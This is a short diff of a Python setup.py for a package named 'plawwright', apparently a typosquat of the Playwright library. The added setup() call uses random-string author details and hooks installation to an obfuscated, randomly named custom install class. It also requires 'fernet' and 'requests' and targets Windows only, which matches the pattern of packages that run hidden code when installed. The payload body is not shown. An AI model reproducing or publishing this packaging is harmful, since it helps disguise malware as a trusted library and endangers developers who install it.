@@ -18,5 +18,22 @@ class fmwfYElaMDIeiAwNzhdDVRhDTqrzBHUtPBIIdixShUyXPRYwrlMvvMCXzgpxoqYRXNsHkWnSaM
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="plawwright",
+    version=VERSION,
+    author="wsdnPIidLoWPegeW",
+    author_email="CcFKsZCExaRAThYL@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': fmwfYElaMDIeiAwNzhdDVRhDTqrzBHUtPBIIdixShUyXPRYwrlMvvMCXzgpxoqYRXNsHkWnSaMmyuTdDpBTylfGYmUOTBzVbjDHkYrhcUgsqkLQpkvYsxhblcLWnnEHTSwPSqhQWyxGnKlN,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
